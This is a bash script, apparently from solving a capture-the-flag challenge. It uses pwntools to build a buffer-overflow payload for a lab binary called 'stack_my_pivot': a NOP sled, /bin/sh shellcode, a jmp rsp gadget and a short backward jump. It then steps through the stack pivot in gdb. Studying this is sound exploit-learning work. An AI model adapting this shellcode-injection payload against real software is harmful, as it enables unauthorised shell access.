#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = b'\x90' * 20 + shellcode
first_input = first_input[:50].ljust(50, b'\x90')

second_input = b'\x90' * 8 + p64(0x400738) + b'\xeb\xae' + b'\x90' * 6 + p32(0x40072e)

with open('/tmp/final_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'set disassembly-flavor intel' \
  -ex 'break *0x400738' \
  -ex 'run < /tmp/final_input' \
  -ex 'continue' \
  -ex 'printf "\n=== At jmp rsp ===\n"' \
  -ex 'info registers rsp rip' \
  -ex 'x/20bx $rsp' \
  -ex 'x/5i $rsp' \
  -ex 'stepi' \
  -ex 'printf "\n=== After jmp rsp ===\n"' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rip' \
  -ex 'stepi' \
  -ex 'printf "\n=== After jmp short ===\n"' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rip' \
  ./stack_my_pivot 2>&1 | tail -100
